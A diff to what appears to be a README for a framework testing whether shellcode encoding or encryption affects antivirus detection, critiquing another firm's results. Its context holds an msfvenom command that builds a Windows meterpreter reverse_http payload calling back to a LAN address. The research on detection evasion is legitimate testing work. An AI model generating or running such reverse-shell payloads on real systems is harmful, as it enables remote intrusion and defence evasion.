@@ -41,6 +41,7 @@ RedSiege came to the following wrong result:
 
 But didnt bother to question the data. There are many issues with it: 
 
+* Why are the top three Base64, UUID, and reverse hex string? Especially the later is very obscure
 * No negative test (without malicious shellcode)
 * Some programs are written in C, some in C#
 * Some use WinAPI (AES, RC4, UUID) which are either an IOC, or may block AV emulator
@@ -66,7 +67,7 @@ I made this framework based on it to test it for myself.
 
 Tests have been performed with einer "random" - a alphanumeric 20 byte string as "shellcode". And "metasploit" 
 with output of `msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.190.134 LPORT=80 -f raw -o beacon.bin`. 
-The "tasploit" does not execute the shellcode, only decodes and prints it. 
+The "metasploit" does not execute the shellcode, only decodes and prints it. 
 
 Conclusion: 
 * The type of encoding/encryption doesnt matter
